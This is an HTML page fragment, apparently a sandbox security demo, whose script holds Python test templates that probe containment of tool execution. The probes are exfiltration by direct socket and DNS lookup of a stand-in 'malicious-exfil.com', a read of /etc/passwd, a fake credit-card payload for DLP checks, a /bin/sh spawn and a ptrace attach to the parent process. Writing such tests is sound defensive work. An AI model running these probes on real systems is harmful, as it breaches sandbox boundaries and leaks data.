...
<body>
    ...
    <script>
        const templates = {
            benign: '# Benign Tool execution inside Sandbox\nimport time, sys, os\nprint("[+] Initializing Secure Task Runtime Environment...")\nprint(f"[+] Worker PID: {os.getpid()}")\nprint(f"[+] Loaded Configuration: {sys.path}")\nprint("[+] Executing benign data transformation task...")\ntime.sleep(0.5)\nprint("[SUCCESS] Tool task completed without egress tampering. Output sanitized.")\n',
            egress_raw: '# Exploit Attempt: Direct TCP socket exfiltration\nimport socket, os\nprint(f"[+] Sandboxed task running as PID {os.getpid()}")\nprint("[+] Attempting to establish covert C2 channel over direct IP connection...")\nprint("[+] Target: 1.1.1.1:80 (Unauthorized External Host)")\ntry:\n    s = socket.socket()\n    s.settimeout(3)\n    s.connect((\'1.1.1.1\', 80))\n    print("[FAIL] Connection succeeded! Zero-Trust Network Bypass Achieved!")\nexcept Exception as e:\n    print(f"[ERROR] Connection intercepted by firewall: {e}")\n',
            dns_allowed: '# Safe DNS query to a whitelisted destination\nimport socket\nprint("[+] Initializing safe API request sequence...")\nprint("[+] Validating endpoint against policy...")\nprint("[+] Resolving whitelisted host: google.com...")\ntry:\n    ip = socket.gethostbyname(\'google.com\')\n    print(f"[SUCCESS] DNS resolved google.com to {ip}")\n    print("[+] Proceeding with secure HTTPS handshake.")\nexcept Exception as e:\n    print(f"[ERROR] Resolution failed: {e}")\n',
            dns_blocked: '# Exploit Attempt: Exfiltration query to unauthorized domain\nimport socket, time\nprint("[+] Sandboxed task initiated. Compiling payload...")\nprint("[+] Payload embedded with sensitive context data.")\nprint("[+] Resolving unauthorized host: malicious-exfil.com to leak data...")\ntry:\n    ip = socket.gethostbyname(\'malicious-exfil.com\')\n    print(f"[FAIL] Domain resolved to {ip}! Exfiltration channel open!")\nexcept Exception as e:\n    print(f"[SUCCESS] Resolution blocked or failed: {e}")\n',
            file_boundary: '# Exploit Attempt: Path traversal access to sensitive data\nimport os\nprint("[+] Enumerating local filesystem structure...")\nprint(f"[+] Current working directory: {os.getcwd()}")\nprint("[+] Attempting path traversal to read restricted system files (/etc/passwd)...")\ntry:\n    with open(\'/etc/passwd\', \'r\') as f:\n        print("[FAIL] Read /etc/passwd successfully! Content leak:\\n" + f.read(150) + "...")\nexcept Exception as e:\n    print(f"[SUCCESS] Path boundary block active: {e}")\n',
            dlp_credit_card: '# Exploit Attempt: Egress Credit Card Data (DLP Redaction)\nimport json\nprint("[+] Processing customer data batch #4091...")\nprint("[+] Preparing outbound JSON payload to CRM system...")\npayload = {\n    "batch_id": "4091",\n    "customer": "John Doe",\n    "account_tier": "Enterprise",\n    "credit_card": "4532 1234 5678 9010",\n    "cvv": "123",\n    "status": "active"\n}\nprint(f"[+] Outbound Payload: {json.dumps(payload, indent=2)}")\nprint("[+] Attempting to transmit data... Check DLP intercept logs. If the payload is blocked/scrubbed, DLP engine is working.")\n',
            anti_tamper_shell: '# Exploit Attempt: Spawning an interactive shell\nimport os, sys\nprint("[+] Advanced Persistent Threat simulation initiated.")\nprint(f"[+] Worker Process ID: {os.getpid()}")\nprint("[+] Escalating privileges and attempting to spawn interactive reverse shell /bin/sh...")\ntry:\n    os.system("/bin/sh -c \'echo Pwned!\'")\n    print("[FAIL] Shell spawned successfully. Kernel eBPF anti-tamper bypassed.")\nexcept Exception as e:\n    print(f"[SUCCESS] Shell blocked: {e}")\n',
            memory_ptrace: '# Exploit Attempt: Debugger attachment (PTRACE_ATTACH)\nimport ctypes, os, time\npid = os.getpid()\nppid = os.getppid()\nprint(f"[+] Local PID: {pid}, Target Parent PID: {ppid}")\nprint("[+] Initializing libc.so.6 bindings to invoke syscalls directly...")\nprint(f"[+] Attempting to attach ptrace (PTRACE_ATTACH=16) to parent process {ppid} to dump enclave memory...")\ntry:\n    libc = ctypes.CDLL("libc.so.6")\n    # PTRACE_ATTACH = 16\n    libc.ptrace(16, ppid, 0, 0)\n    print("[FAIL] Ptrace attachment succeeded! Memory extraction in progress. Anti-Tamper bypassed.")\nexcept Exception as e:\n    print(f"[SUCCESS] Ptrace blocked: {e}")\n'
        };
